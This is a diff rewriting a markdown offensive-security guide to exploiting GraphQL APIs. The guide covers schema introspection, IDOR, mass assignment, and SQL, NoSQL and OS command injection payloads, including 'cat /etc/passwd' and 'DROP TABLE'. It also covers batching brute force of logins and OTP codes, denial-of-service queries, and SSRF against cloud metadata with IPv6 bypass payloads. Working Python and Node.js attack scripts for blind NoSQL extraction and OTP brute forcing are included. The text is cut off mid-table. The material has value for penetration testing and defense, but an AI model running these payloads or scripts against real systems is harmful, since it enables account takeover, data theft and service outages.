@@ -1,396 +1,294 @@
-# GraphQL Deep Dive: Complete Exploitation Methodologies
-
----
+# GraphQL Deep Dive
 
 ## Table of Contents
-- [Part 1: Reconnaissance & Discovery](#part-1-reconnaissance--discovery)
-- [Part 2: Authentication & Authorization Bypass](#part-2-authentication--authorization-bypass)
-- [Part 3: Injection Attacks](#part-3-injection-attacks)
-- [Part 4: Batching Attacks](#part-4-batching-attacks)
-- [Part 5: Denial of Service](#part-5-denial-of-service)
-- [Part 6: SSRF via GraphQL](#part-6-ssrf-via-graphql)
-- [Part 7: Subscriptions & WebSocket Attacks](#part-7-subscriptions--websocket-attacks)
-- [Part 8: Complete Testing Checklist](#part-8-complete-testing-checklist)
+- [Reconnaissance](#reconnaissance)
+- [Authentication & Authorization Bypass](#authentication--authorization-bypass)
+- [Injection Attacks](#injection-attacks)
+- [Batching Attacks](#batching-attacks)
+- [Denial of Service](#denial-of-service)
+- [SSRF via GraphQL](#ssrf-via-graphql)
+- [File Upload Attacks](#file-upload-attacks)
+- [Subscriptions & WebSocket Attacks](#subscriptions--websocket-attacks)
+- [Tools & Automation](#tools--automation)
+- [Defense Bypass Techniques](#defense-bypass-techniques)
+- [Real-World Vulnerabilities (CVEs)](#real-world-vulnerabilities-cves)
+- [Checklist](#checklist)
+- [Related Topics](#related-topics)
 
 ---
 
-## Part 1: Reconnaissance & Discovery
+## Reconnaissance
 
-### 1.1 Finding GraphQL Endpoints
+### Endpoint Discovery
 
-GraphQL endpoints are often exposed under predictable paths. Here's how to find them systematically.
+GraphQL endpoints are often exposed under predictable paths. Here is a comprehensive list of common endpoints to test:
 
-**Common Endpoint Paths to Test:**
-```
+```bash
+# Common GraphQL endpoints
 /graphql
 /graphql/console
 /graphql/api
+/graphql/graphql
 /graphiql
 /graphiql.php
-/playground
-/altair
+/graphiql.js
+/graphql.php
+/graphql/schema.json
+/v1/graphql
+/v2/graphql
+/api/graphql
+/api/graphql/v1
+/api/graphql/v2
 /query
 /gql
-/v1/graphql
-/api/graphql
+/playground
+/altair
+/graphql/playground
+/graphql/subscriptions
 /subscriptions
-```
 
-**Method 1: JavaScript File Analysis**
-Many modern applications bundle GraphQL endpoint references in their JavaScript files. Use browser DevTools or command-line tools to search for patterns:
-```bash
-# Download all JS files and search for GraphQL patterns
-curl -s https://target.com | grep -o 'src="[^"]*\.js"' | cut -d'"' -f2 | while read js; do
-  curl -s "https://target.com/$js" | grep -iE 'graphql|query|mutation|apollo'
-done
-
-# Search for endpoint patterns in JS
-grep -rE '"/graphql"|"/query"|graphql\.php' /path/to/js/files/
-```
-
-**Method 2: Automated Discovery with Nuclei**
-```bash
+# Nuclei template for automated detection
 nuclei -u https://target.com -t graphql-detect.yaml
 ```
 
-**Method 3: Wayback Machine & Archive Scans**
+**Real-world tip:** Many GraphQL endpoints are discovered by examining JavaScript bundles. Use browser DevTools to search for `/graphql`, `query`, `mutation`, or `ApolloClient` in source files.
+
+### Introspection Query
+
+Introspection is the built-in GraphQL feature that allows clients to query the schema. When enabled, it provides a complete map of all available queries, mutations, types, and fields.
+
 ```bash
-# Find historical GraphQL endpoints
-curl "https://web.archive.org/cdx/search/cdx?url=target.com/*&output=json" | grep -i graphql
-```
-
-### 1.2 Introspection Queries (When Enabled)
-
-Introspection is GraphQL's self-documentation feature. When enabled, it reveals the entire API schema.
-
-**Simple Test for Introspection:**
-```bash
+# Full introspection query - use this to dump the entire schema
 curl -X POST https://target.com/graphql \
   -H "Content-Type: application/json" \
-  -d '{"query":"{ __schema { queryType { name } } }"}'
+  -d '{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"}'
+
+# Quick schema dump - simpler but less detailed
+curl -X POST https://target.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ __schema { types { name fields { name } } } }"}'
+
+# Get all available queries
+curl -X POST https://target.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ __schema { queryType { fields { name description } } } }"}'
+
+# Get all available mutations
+curl -X POST https://target.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ __schema { mutationType { fields { name description } } } }"}'
+
+# Get all available subscriptions
+curl -X POST https://target.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ __schema { subscriptionType { fields { name description } } } }"}'
 ```
 
-If introspection is enabled, you'll receive schema information. If disabled, you'll typically see an error like `"Introspection is not allowed"` .
+### Tools for Discovery
 
-**Complete Schema Dump Query:**
+Several specialized tools can automate and enhance GraphQL reconnaissance:
+
+```bash
+# GraphQL Voyager - Interactive schema visualization
+# https://github.com/APIs-guru/graphql-voyager
+# Run locally to visualize the schema as an interactive graph
+npx graphql-voyager --endpoint https://target.com/graphql
+
+# graphql-cop - Security auditor with extensive checks
+# https://github.com/dolevf/graphql-cop
+python graphql-cop.py -t https://target.com/graphql
+
+# InQL - Burp extension & CLI from Doyensec
+# https://github.com/doyensec/inql
+inql -t https://target.com/graphql
+
+# graphw00f - GraphQL server fingerprinting
+# https://github.com/dolevf/graphw00f
+python main.py -d -t https://target.com/graphql
+
+# Clairvoyance - Recover schema when introspection is disabled
+# https://github.com/nikitastupin/clairvoyance
+python -m clairvoyance -o schema.json https://target.com/graphql
+```
+
+---
+
+## Authentication & Authorization Bypass
+
+### Bypass Introspection Restrictions
+
+When introspection is disabled, you can still attempt to extract schema information through alternative methods:
+
+```bash
+# Try introspection via GET request (sometimes POST restriction only)
+curl "https://target.com/graphql?query=\{__schema\{types\{name\}\}\}"
+
+# Add X-Requested-With header to mimic AJAX request
+curl -X POST https://target.com/graphql \
+  -H "Content-Type: application/json" \
+  -H "X-Requested-With: XMLHttpRequest" \
+  -d '{"query":"{ __schema { types { name } } }"}'
+
+# Use __type instead of __schema - sometimes less restricted
+curl -X POST https://target.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ __type(name: \"User\") { fields { name } } }"}'
+
+# Field suggestions - send invalid query and check error messages
+curl -X POST https://target.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ user { asdfasdf } }"}'
+# Response may contain: Did you mean "id", "name", "email"?
+```
+
+**Real-world example (Parse Server - CVE-2026-32594):** The GraphQL WebSocket endpoint for subscriptions bypassed Express middleware entirely, allowing attackers to access the GraphQL schema via introspection even when public introspection was disabled, and send arbitrarily complex queries that bypassed configured complexity limits .
+
+### Authorization Flaws
+
+Authorization vulnerabilities in GraphQL often manifest as IDOR (Insecure Direct Object References) or field-level access control issues:
+
 ```graphql
-query IntrospectionQuery {
-  __schema {
-    queryType { name }
-    mutationType { name }
-    subscriptionType { name }
-    types {
-      ...FullType
-    }
-    directives {
-      name
-      description
-      locations
-      args { ...InputValue }
-    }
+# IDOR - Access other users' data by changing ID
+query {
+  user(id: "1") {
+    id
+    email
+    password
+    creditCard
   }
 }
 
-fragment FullType on __Type {
-  kind
-  name
-  description
-  fields(includeDeprecated: true) {
-    name
-    description
-    args { ...InputValue }
-    type { ...TypeRef }
-    isDeprecated
-    deprecationReason
+# Test with different ID values
+query {
+  user(id: "2") {
+    id
+    email
+    phoneNumber
+    ssn
   }
-  inputFields { ...InputValue }
-  interfaces { ...TypeRef }
-  enumValues(includeDeprecated: true) {
-    name
-    description
-    isDeprecated
-    deprecationReason
-  }
-  possibleTypes { ...TypeRef }
 }
 
-fragment InputValue on __InputValue {
-  name
-  description
-  type { ...TypeRef }
-  defaultValue
+# Access admin-only fields (if you can guess or discover them)
+query {
+  user(id: "1") {
+    id
+    email
+    isAdmin
+    role
+    permissions
+    apiKey
+    resetToken
+  }
 }
 
-fragment TypeRef on __Type {
-  kind
-  name
-  ofType {
-    kind
-    name
-    ofType {
-      kind
-      name
-      ofType {
-        kind
-        name
+# Access deeply nested objects - often authorization is only checked at top level
+query {
+  user(id: "1") {
+    orders {
+      id
+      total
+      paymentDetails {
+        cardNumber
+        cvv
+        expiryDate
+      }
+      shippingAddress {
+        street
+        city
+        zipCode
       }
     }
   }
 }
-```
 
-### 1.3 Bypassing Introspection Restrictions
-
-When introspection is disabled, try these techniques:
-
-**Technique 1: Field Suggestion Abuse**
-GraphQL's field suggestion feature can reveal schema information even when introspection is disabled. Send an invalid query and examine error messages :
-```bash
-curl -X POST https://target.com/graphql \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ user { asdfasdf } }"}'
-```
-The response may contain helpful suggestions like `"Did you mean 'id', 'name', 'email'?"`
-
-**Technique 2: __type Queries**
-Sometimes `__schema` is blocked but `__type` is not:
-```bash
-curl -X POST https://target.com/graphql \
-  -d '{"query":"{ __type(name: \"User\") { fields { name } } }"}'
-```
-
-**Technique 3: GET Request Introspection**
-Some servers only block introspection on POST requests:
-```bash
-curl "https://target.com/graphql?query=%7B__schema%7BqueryType%7Bname%7D%7D%7D"
-```
-
-**Technique 4: Clairvoyance Tool**
-When introspection is completely disabled, use Clairvoyance to recover the schema through brute-force field discovery :
-```bash
-python -m clairvoyance -o schema.json https://target.com/graphql
-```
-
-### 1.4 Tools for Reconnaissance
-
-| Tool | Purpose | Installation/Usage |
-|------|---------|-------------------|
-| **GraphQL Voyager** | Visualize schema interactively | `npx graphql-voyager --endpoint https://target.com/graphql`  |
-| **InQL Scanner** | Burp extension for schema analysis | Install from BApp Store or `pip install inql`  |
-| **graphw00f** | Fingerprint GraphQL implementation | `python main.py -d -t https://target.com/graphql` |
-| **Metasploit Module** | Automated introspection scanning | `use auxiliary/scanner/http/graphql_introspection_scanner`  |
-| **GQLMap** | Automated endpoint discovery and testing | `python gqlmap.py https://target.com --crawl --introspect`  |
-
-### 1.5 Using Burp Suite for GraphQL Testing
-
-**Setting Up Burp Suite :**
-1. Configure Burp as a proxy (listening on 127.0.0.1:8080)
-2. Install the InQL extension from BApp Store
-3. Configure your browser to use the Burp proxy
-4. Navigate to the target application
-
-**InQL Scanner Features :**
-- Automatic GraphQL endpoint discovery
-- Introspection query execution
-- Query template generation for all discovered types
-- Direct integration with Burp Repeater
-
-**Using InQL from Command Line :**
-```bash
-# Generate query templates from a schema
-inql -t https://target.com/graphql --generate-queries --generate-html -o ./output
-
-# Use with a schema file
-inql -f schema.json --generate-queries --generate-html
-```
-
----
-
-## Part 2: Authentication & Authorization Bypass
-
-### 2.1 Insecure Direct Object Reference (IDOR)
-
-IDOR occurs when an attacker can access another user's data by modifying an identifier parameter.
-
-**Real-World Exploitation Steps:**
-
-**Step 1: Identify an object query**
-Using introspection, find queries that accept ID parameters:
-```graphql
-query {
-  user(id: "1") {
-    id
-    name
-    email
-  }
-}
-```
-
-**Step 2: Test for IDOR**
-Modify the ID value and observe if you receive another user's data :
-```graphql
-query {
-  user(id: "2") {
-    id
-    name
-    email
-  }
-}
-```
-
-**Step 3: Use Batching to Enumerate Many IDs**
-```graphql
+# Batch query for multiple IDs in one request
 query {
   u1: user(id: "1") { email }
   u2: user(id: "2") { email }
   u3: user(id: "3") { email }
   u4: user(id: "4") { email }
-  # ... continue
 }
 ```
 
-**Real-World Example:**
-In a typical bug bounty scenario, a hacker might find a `currentUser` query that accepts an `internalId` parameter. Changing this ID reveals other users' data, indicating an IDOR vulnerability .
+**Real-world example (Erxes - CVE-2024-57190):** An improper access control vulnerability allowed attackers to bypass authentication by manipulating the HTTP "User" header, enabling unauthorized access to any GraphQL endpoint without valid credentials. This vulnerability had a CVSS score of 9.8 (Critical) and affected all versions prior to 1.6.1 .
 
-### 2.2 Field-Level Authorization Bypass
+### Automated Authorization Testing
 
-Sometimes authorization is only checked at the root level, allowing attackers to request sensitive nested fields.
-
-**Testing for Over-Fetching Vulnerabilities:**
-```graphql
-query {
-  listPosts(postId: 13) {
-    title
-    description
-    # Try adding unexpected fields
-    user {
-      username
-      email
-      password
-      resetToken
-    }
-  }
-}
-```
-
-If the query returns data for fields you shouldn't have access to, this is a vulnerability .
-
-### 2.3 Mass Assignment in Mutations
-
-Mass assignment occurs when a mutation accepts more fields than intended, allowing privilege escalation.
-
-**Exploitation Steps :**
-
-**Step 1: Find a user creation mutation**
-```graphql
-mutation {
-  registerAccount(
-    nickname: "attacker", 
-    email: "attacker@example.com", 
-    password: "password123"
-  ) {
-    token {
-      accessToken
-    }
-    user {
-      email
-      nickname
-      role
-    }
-  }
-}
-```
-
-**Step 2: Add the role field to the mutation**
-```graphql
-mutation {
-  registerAccount(
-    nickname: "attacker", 
-    email: "attacker@example.com", 
-    password: "password123", 
-    role: "Admin"
-  ) {
-    token {
-      accessToken
-    }
-    user {
-      email
-      nickname
-      role
-    }
-  }
-}
-```
-
-If the response shows `role: "Admin"`, you've successfully exploited mass assignment.
-
-### 2.4 Authentication Bypass via Headers
-
-**Real-World Vulnerability (CVE-2024-57190 - Erxes):**
-An improper access control vulnerability allowed attackers to bypass authentication by manipulating the HTTP "User" header. This enabled unauthorized access to any GraphQL endpoint without valid credentials (CVSS 9.8 Critical).
-
-**Testing Approach:**
-1. Intercept a GraphQL request
-2. Modify or remove authentication headers
-3. Test custom headers like `X-User`, `X-User-ID`, `User`
-4. Observe if the request is still processed
-
-### 2.5 Token Scope Bypass
-
-**Testing Methodology with graphql-authz-fuzzer:**
 ```bash
-# Test what operations a read-only token can perform
+# GraphQL Authorization Fuzzer - Tests token scope enforcement
+# https://github.com/Peterc3-dev/graphql-authz-fuzzer
+# The key insight: if a read-only token gets "resource not found" instead of "scope insufficient",
+# the resolver ran - meaning scope enforcement is missing at the GraphQL layer.
+
+# Basic usage - introspect and test all mutations with a restricted token
 gql-authz-fuzz https://target.com/api/graphql --token <read_only_token>
 
-# The tool classifies responses:
-# - SCOPE_BLOCKED: Token scope properly rejected the operation (good)
-# - SUCCESS: Mutation executed with restricted token (critical finding)
-# - RESOLVER_DENIED: Auth passed but resolver denied
+# Save schema only for later analysis
+gql-authz-fuzz https://target.com/api/graphql --schema-only -o ./recon
+
+# Resume interrupted scan
+gql-authz-fuzz https://target.com/api/graphql --token <token> --resume
+
+# GitLab-specific (with ambiguous error patterns)
+gql-authz-fuzz https://gitlab.com/api/graphql \
+  --token glpat-xxxxx \
+  --id-format "gid://gitlab/{model}/999999999" \
+  --ambiguous "the resource that you are attempting to access does not exist or you don't have permission"
 ```
 
-**Real-World Vulnerability (CVE-2025-11340 - GitLab):**
-GitLab `read_api` tokens could invoke write mutations on vulnerability records because scope was not enforced at the GraphQL layer. The key insight: if a read-only token gets "resource not found" instead of "scope insufficient", the resolver ran - meaning scope enforcement is missing.
+The tool classifies responses into categories that indicate whether the mutation resolver was reached:
+- `SCOPE_BLOCKED` - Token scope was explicitly rejected (good enforcement)
+- `SUCCESS` - Mutation executed with restricted token (critical finding - scope not enforced)
+- `RESOLVER_DENIED` - Auth passed but resolver denied (scope missing but role/ownership enforced)
+
+**Real-world example:** This technique discovered CVE-2025-11340, where GitLab `read_api` tokens could invoke write mutations on vulnerability records because scope was not enforced at the GraphQL layer .
 
 ---
 
-## Part 3: Injection Attacks
+## Injection Attacks
 
-### 3.1 SQL Injection
+GraphQL injection attacks occur when resolvers unsafely embed user-supplied arguments into database queries. The root cause is always the same: untrusted data is treated as executable code rather than as data .
 
-GraphQL's type system validates data format (e.g., String), not content. A legitimate-looking string can contain malicious SQL.
+### SQL Injection
 
-**Testing for SQL Injection:**
+GraphQL's type system only validates data format (e.g., String), not content. A legitimate-looking string can contain malicious SQL .
 
-**Step 1: Identify user input points**
-Look for queries with string arguments:
 ```graphql
-query {
-  user(name: "admin") {
-    id
-    email
-  }
-}
-```
-
-**Step 2: Test with SQL injection payloads**
-```graphql
-# Boolean-based
+# Basic SQLi in arguments - test for boolean-based injection
 query {
   user(name: "admin' OR '1'='1") {
     id
     email
+    password
   }
 }
 
-# Union-based
+# Union-based injection to extract data from other tables
 query {
-  user(name: "' UNION SELECT username, password FROM users--") {
+  user(name: "' UNION SELECT username, password, NULL FROM admin_users--") {
     id
     email
   }
 }
 
-# Time-based
+# In filter arguments (common in search functionality)
+query {
+  users(filter: { name_contains: "' OR 1=1--" }) {
+    id
+    name
+    email
+  }
+}
+
+# In order by clause - often directly concatenated into ORDER BY
+query {
+  users(orderBy: "name; DROP TABLE users--") {
+    id
+    name
+  }
+}
+
+# Time-based blind injection
 query {
   user(id: "1' AND (SELECT pg_sleep(5))--") {
     id
@@ -398,34 +296,46 @@ query {
 }
 ```
 
-**Step 3: Analyze error messages**
-Error messages often reveal database type and structure. Look for:
-- PostgreSQL: `PG::SyntaxError`
-- MySQL: `You have an error in your SQL syntax`
-- SQL Server: `Unclosed quotation mark`
+**Vulnerable resolver example (Node.js):**
+```javascript
+const resolvers = {
+  Query: {
+    user: async (_, { id }) => {
+      // DANGER: Direct string concatenation
+      const query = `SELECT * FROM users WHERE id = '${id}'`;
+      return db.query(query);
+    }
+  }
+};
+```
 
-**Automated Testing with Burp Intruder:**
-1. Send the GraphQL request to Intruder
-2. Set payload position on the argument value
-3. Use SQL injection payload list
-4. Analyze response differences
+**Safe resolver using parameterized queries:**
+```javascript
+const resolvers = {
+  Query: {
+    user: async (_, { id }) => {
+      const query = 'SELECT * FROM users WHERE id = ?';
+      return db.query(query, [id]);
+    }
+  }
+};
+```
 
-### 3.2 NoSQL Injection
+### NoSQL Injection
 
-**Testing for NoSQL Injection in MongoDB backends:**
+NoSQL injection is particularly dangerous when MongoDB's `$where` operator is used, as it executes arbitrary JavaScript .
 
-**Step 1: Test with $gt operator**
 ```graphql
+# Basic MongoDB injection with $gt operator
 query {
   user(name: "{\"$gt\": \"\"}") {
     id
     email
+    password
   }
 }
-```
 
-**Step 2: Extract all data with regex**
-```graphql
+# Regex injection to extract all data
 query {
   users(filter: { name_regex: ".*" }) {
     id
@@ -433,10 +343,16 @@ query {
     password
   }
 }
-```
 
-**Step 3: JavaScript execution via $where**
-```graphql
+# JavaScript execution via $where (extremely dangerous)
+query {
+  usersNoSQL(filter: "true") {
+    id
+    username
+  }
+}
+
+# Extract specific user data
 query {
   usersNoSQL(filter: "this.username == 'admin'") {
     id
@@ -444,15 +360,66 @@ query {
     password
   }
 }
+
+# Process termination - if MongoDB has server-side JS enabled
+query {
+  usersNoSQL(filter: "function(){ return process.exit(1); }()") {
+    id
+  }
+}
 ```
 
-### 3.3 OS Command Injection
+**Vulnerable resolver example:**
+```javascript
+const resolvers = {
+  Query: {
+    usersNoSQL: async (_, { filter }) => {
+      // DANGER: Direct injection into $where
+      const query = { $where: `function() { return ${filter}; }` };
+      return await collection.find(query).toArray();
+    }
+  }
+};
+```
 
-**Testing for Command Injection:**
-Look for mutations that perform system operations like file conversion, report generation, or data export.
+**Real-world exploitation script for blind NoSQL injection:**
+```python
+#!/usr/bin/env python3
+import requests
+import json
+import string
+
+def blind_noql_injection(url, field, target_value):
+    """Extract data character by character using blind NoSQL injection"""
+    extracted = ""
+    charset = string.ascii_lowercase + string.digits + "_{}"
+    
+    for position in range(1, 50):
+        for char in charset:
+            # Injects JavaScript condition that returns true only when character matches
+            payload = f"this.{field}[{position-1}] == '{char}'"
+            query = {
+                "query": f"""
+                query {{
+                  usersNoSQL(filter: "{payload}") {{
+                    id
+                    username
+                  }}
+                }}
+                """
+            }
+            response = requests.post(url, json=query)
+            if len(response.json().get('data', {}).get('usersNoSQL', [])) > 0:
+                extracted += char
+                print(f"[+] Found: {extracted}")
+                break
+    return extracted
+```
+
+### OS Command Injection
 
 ```graphql
-# Test with command separators
+# If backend executes shell commands (e.g., generating reports, exporting data)
 mutation {
   exportData(format: "csv; cat /etc/passwd") {
     url
@@ -462,6 +429,7 @@ mutation {
 mutation {
   generateReport(type: "pdf`whoami`") {
     status
+    output
   }
 }
 
@@ -472,115 +440,100 @@ mutation {
 }
 ```
 
-### 3.4 Using GQLMap for Injection Testing
-
-GQLMap is an automated GraphQL penetration testing tool that supports injection fuzzing .
-
-```bash
-# Install GQLMap
-git clone https://github.com/nknaman5121a/GQLMap-
-cd GQLMap
-pip install -r requirements.txt
-
-# Run injection tests
-python gqlmap.py https://target.com --inject
-
-# With authentication token
-python gqlmap.py https://target.com --token eyJhbGciOiJIUzI1NiIs... --inject
-
-# Custom endpoint
-python gqlmap.py https://target.com --endpoint /api/graphql --inject --threads 10
-```
-
 ---
 
-## Part 4: Batching Attacks
+## Batching Attacks
 
-### 4.1 What is Batching?
+Batching is a GraphQL feature that allows multiple operations to be sent in a single HTTP request. Attackers exploit this to bypass rate limiting, brute-force credentials, or enumerate OTPs .
 
-Batching allows multiple GraphQL operations to be sent in a single HTTP request. This feature can be abused to bypass rate limiting and perform brute-force attacks .
-
-### 4.2 Array-Based Batching
+### Query Batching for Brute Force
 
 ```bash
+# Array-based batching - each element is a separate operation
 curl -X POST https://target.com/graphql \
   -H "Content-Type: application/json" \
   -d '[
     {"query":"mutation { login(email:\"admin@example.com\", password:\"password1\") { token } }"},
     {"query":"mutation { login(email:\"admin@example.com\", password:\"password2\") { token } }"},
-    {"query":"mutation { login(email:\"admin@example.com\", password:\"password3\") { token } }"}
+    {"query":"mutation { login(email:\"admin@example.com\", password:\"password3\") { token } }"},
+    {"query":"mutation { login(email:\"admin@example.com\", password:\"password4\") { token } }"},
+    {"query":"mutation { login(email:\"admin@example.com\", password:\"password5\") { token } }"}
   ]'
+
+# Alias-based batching - single query with multiple aliased mutations
+curl -X POST https://target.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"mutation { 
+    a1: login(email:\"admin@example.com\", password:\"password1\") { token }
+    a2: login(email:\"admin@example.com\", password:\"password2\") { token }
+    a3: login(email:\"admin@example.com\", password:\"password3\") { token }
+    a4: login(email:\"admin@example.com\", password:\"password4\") { token }
+    a5: login(email:\"admin@example.com\", password:\"password5\") { token }
+  }"}'
 ```
 
-### 4.3 Alias-Based Batching
+### OTP/2FA Bypass via Batching
+
+Two-factor authentication codes are typically 6 digits (1,000,000 possibilities). With batching, an attacker can test all codes in a single request .
 
 ```graphql
+# Brute force OTP in single request using aliases
 mutation {
-  a1: login(email: "admin@example.com", password: "password1") { token }
-  a2: login(email: "admin@example.com", password: "password2") { token }
-  a3: login(email: "admin@example.com", password: "password3") { token }
+  v0: verifyOTP(email: "victim@example.com", code: "000000") { success token }
+  v1: verifyOTP(email: "victim@example.com", code: "000001") { success token }
+  v2: verifyOTP(email: "victim@example.com", code: "000002") { success token }
+  v3: verifyOTP(email: "victim@example.com", code: "000003") { success token }
+  # ... continue to 999999
 }
 ```
 
-### 4.4 OTP Brute Force via Batching
+**Real-world exploitation script (Node.js):**
+```javascript
+// From Hack The Box - SpeedNet challenge
+const axios = require('axios');
 
-Two-factor authentication codes are typically 6 digits (1,000,000 possibilities). With batching, an attacker can test many codes in a single request .
+const ENDPOINT = 'https://target.com/graphql';
+const BATCH_SIZE = 200;
+const DELAY_MS = 1000;
 
-**Exploitation Script:**
-```python
-import requests
-import json
-
-def brute_force_otp(endpoint, email, batch_size=100):
-    for start in range(0, 1000000, batch_size):
-        batch = []
-        for i in range(batch_size):
-            otp = str(start + i).zfill(6)
-            batch.append({
-                "query": f"mutation {{ v{i}: verifyOTP(email: \"{email}\", code: \"{otp}\") {{ success token }} }}"
-            })
+async function bruteForceOTP() {
+    for (let start = 0; start <= 999999; start += BATCH_SIZE) {
+        let batch = [];
+        for (let i = 0; i < BATCH_SIZE && start + i <= 999999; i++) {
+            const otp = String(start + i).padStart(6, '0');
+            batch.push({
+                query: `mutation { attempt${i}: verifyOTP(code: "${otp}") { success token } }`
+            });
+        }
         
-        response = requests.post(endpoint, json=batch)
-        data = response.json()
+        console.log(`Trying OTP range: ${start} - ${start + BATCH_SIZE}`);
+        const response = await axios.post(ENDPOINT, batch);
         
-        # Check each response for success
-        for key, value in data.get('data', {}).items():
-            if value.get('success'):
-                print(f"OTP found: {key}")
-                return
-    
-    print("OTP not found in range")
+        // Check each response for success
+        for (const key in response.data.data) {
+            if (response.data.data[key].success) {
+                console.log(`OTP FOUND: ${key.replace('attempt', '')}`);
+                return;
+            }
+        }
+        
+        await new Promise(resolve => setTimeout(resolve, DELAY_MS));
+    }
+}
 
-# Usage
-brute_force_otp("https://target.com/graphql", "victim@example.com")
-```
-
-### 4.5 Using CrackQL for Automated Batching Attacks
-
-CrackQL is a tool specifically designed for brute-force attacks using GraphQL batching .
-
-```bash
-# Basic usage
-python CrackQL.py -t https://target.com/graphql \
-  -q "mutation { login(email: \"VARIABLE\", password: \"PASSWORD\") { token } }" \
-  -i emails.txt -p passwords.txt
-
-# With custom headers
-python CrackQL.py -t https://target.com/graphql \
-  -q "mutation { login(email: \"VARIABLE\", password: \"PASSWORD\") { token } }" \
-  -i emails.txt -p passwords.txt \
-  -H "Authorization: Bearer token123"
+bruteForceOTP();
 ```
 
 ---
 
-## Part 5: Denial of Service
+## Denial of Service
 
-### 5.1 Recursive Query Attack
+### Recursive Query (Circular References)
 
-When the schema contains circular relationships, deeply nested queries can cause exponential resource consumption.
+When the schema contains circular relationships (e.g., User has friends that are also Users), deeply nested queries can cause exponential resource consumption.
 
 ```graphql
+# Recursive friend query - each level multiplies the number of database queries
 query {
   user(id: "1") {
     friends {
@@ -589,7 +542,16 @@ query {
           friends {
             friends {
               friends {
-                name
+                friends {
+                  friends {
+                    friends {
+                      friends {
+                        name
+                        email
+                      }
+                    }
+                  }
+                }
               }
             }
           }
@@ -600,34 +562,54 @@ query {
 }
 ```
 
-### 5.2 Field Duplication Attack
+### Field Duplication
 
-**Real-World Vulnerability (CVE-2024-39895 - Directus):**
-A denial of service vulnerability existed where an attacker could duplicate fields many times in a single GraphQL query, causing the server to perform redundant computations and consume excessive resources.
+**Real-world example (Directus - CVE-2024-39895):** A denial of service vulnerability existed where an attacker could duplicate fields many times in a single GraphQL query, causing the server to perform redundant computations and consume excessive resources. Request to the `/graphql` endpoint were sent when visualizing graphs generated at a dashboard. By modifying the data sent and duplicating many times the fields, a DoS attack was possible. This was fixed in version 10.12.0 .
 
 ```graphql
+# Field duplication attack - requesting the same field hundreds of times
 query {
   users {
     name name name name name name name name name name
+    name name name name name name name name name name
+    name name name name name name name name name name
     email email email email email email email email email email
+    email email email email email email email email email email
+    email email email email email email email email email email
+    id id id id id id id id id id
     id id id id id id id id id id
   }
 }
 ```
 
-### 5.3 Batch Query DoS
+### Batch Query DoS
 
 ```bash
-# Generate 10,000 identical queries
+# Send thousands of queries in a single array
 python3 -c "import json; print(json.dumps([{'query':'{ users { name } }'}]*10000))" | \
   curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d @-
 ```
 
-### 5.4 Query Depth Attack
+### Directive Overloading
 
 ```graphql
+# Excessive directives can cause parsing overhead
+query {
+  users @skip(if: false) @skip(if: false) @skip(if: false) @skip(if: false) {
+    name @include(if: true) @include(if: true) @include(if: true) {
+      firstName
+      lastName
+    }
+  }
+}
+```
+
+### Query Depth Attack
+
+```graphql
+# Extremely deep nesting without circular references
 query {
   level1 {
     level2 {
@@ -655,408 +637,553 @@ query {
 
 ---
 
-## Part 6: SSRF via GraphQL
+## SSRF via GraphQL
 
-### 6.1 Basic SSRF Testing
-
-Look for mutations or queries that accept URLs for importing, fetching, or webhook functionality.
+Server-Side Request Forgery occurs when a GraphQL mutation or query fetches a URL provided by the user without proper validation.
 
 ```graphql
-# Test with internal addresses
+# If there's a URL import or webhook field
 mutation {
-  importUrl(url: "http://169.254.169.254/latest/meta-data/") {
+  importUrl(url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin") {
     content
+    status
   }
 }
 
-# Test with localhost
+# AWS metadata service
 mutation {
-  fetchUrl(url: "http://localhost:8080/admin") {
-    response
+  fetchResource(url: "http://169.254.169.254/latest/user-data") {
+    data
   }
 }
 
-# Test with file protocol
+# File protocol for local file disclosure
 mutation {
   importUrl(url: "file:///etc/passwd") {
     content
   }
 }
-```
 
-### 6.2 Real-World SSRF: Craft CMS CVE-2025-68437
-
-**Vulnerability Details:**
-An SSRF vulnerability existed in Craft CMS's GraphQL asset upload mutation via the `_file` URL parameter. Attackers could exploit this to make requests to internal services.
-
-**Exploitation Steps :**
-
-**Step 1: Verify the endpoint accepts URL-based asset uploads**
-```bash
-curl -X POST https://target.com/graphql \
-  -H "Content-Type: application/json" \
-  -d '{
-    "query": "mutation { save_photos_Asset(_file: { url: \"http://example.com/test.txt\", filename: \"test.txt\" }) { id } }"
-  }'
-```
-
-**Step 2: Test for SSRF to AWS Metadata**
-```bash
-curl -X POST https://target.com/graphql \
-  -H "Content-Type: application/json" \
-  -d '{
-    "query": "mutation { save_photos_Asset(_file: { url: \"http://169.254.169.254/latest/meta-data/\", filename: \"metadata.txt\" }) { id } }"
-  }'
-```
-
-**Step 3: IPv6 SSRF Bypass (CVE-2026-32594 Bypass)**
-The fix for CVE-2025-68437 used `gethostbyname()` which only resolves IPv4 addresses. When a hostname has only AAAA (IPv6) records, the function returns the hostname string itself, causing the blocklist comparison to fail .
-
-**Bypass Payloads for Cloud Metadata :**
-
-| Cloud Provider | Blocked IPv4 | IPv6 Equivalent | Bypass Payload |
-|----------------|--------------|-----------------|----------------|
-| AWS EC2 IMDS | 169.254.169.254 | fd00:ec2::254 | `http://fd00-ec2--254.sslip.io/latest/meta-data/` |
-| Google Cloud | 169.254.169.254 | fd20:ce::254 | `http://fd20-ce--254.sslip.io/` |
